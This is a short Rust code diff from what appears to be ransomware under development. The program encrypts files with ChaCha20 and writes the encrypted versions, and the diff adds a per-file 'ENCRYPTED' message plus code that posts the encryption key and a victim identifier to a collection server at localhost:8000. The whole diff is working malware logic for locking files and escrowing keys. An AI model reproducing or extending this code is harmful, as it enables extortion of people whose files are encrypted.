@@ -22,8 +22,16 @@ fn main() {
 			let encrypted = chacha20::stream_xor(&plaintext, &nonce, &key);
 
 			files::write_file(&newfilename, &encrypted).expect("Error writing file");
+			println!("ENCRYPTED {}", filename);
 		}
 	}
 
+
 	println!("KEY: {:?}", cryptography::chacha_export(&key));
+	let post = vec![
+		("uuid", String::from("abc")),
+		("key", cryptography::chacha_export(&key))
+	];
+	networking::post("http://localhost:8000", &post);
+	// TODO: not saved in keys.json yet?
 }
